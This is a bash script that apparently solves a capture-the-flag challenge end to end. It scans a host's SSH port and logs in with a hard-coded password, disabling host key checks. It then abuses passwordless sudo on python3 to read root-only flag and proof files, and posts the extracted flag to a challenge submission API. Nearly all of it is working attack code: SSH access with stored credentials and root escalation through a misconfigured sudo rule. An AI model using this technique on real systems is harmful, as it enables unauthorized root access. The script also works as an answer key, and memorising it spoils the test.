#!/bin/bash
set -euo pipefail

HOST=172.20.0.141
USER=forge
PASSWORD='NeonFoundry-6!Relay'
CHALLENGE_ID='scl-challenge-frame-f78e9a'

nmap -Pn -p 22 --open "$HOST" >/dev/null
output=$(sshpass -p "$PASSWORD" ssh -T \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "$USER@$HOST" \
  "sudo -n /usr/bin/python3 -c 'import os; os.setuid(0); print(open(\"/root/flag\").read().strip()); print(open(\"/root/.escalation-proof\").read().strip())'")
printf '%s\n' "$output"
flag=$(printf '%s\n' "$output" | grep -oE 'BSY\{[^}]+\}' | head -n 1)
if [[ -z "$flag" ]]; then
  echo 'Could not extract the challenge flag.' >&2
  exit 1
fi
payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
printf '\n'
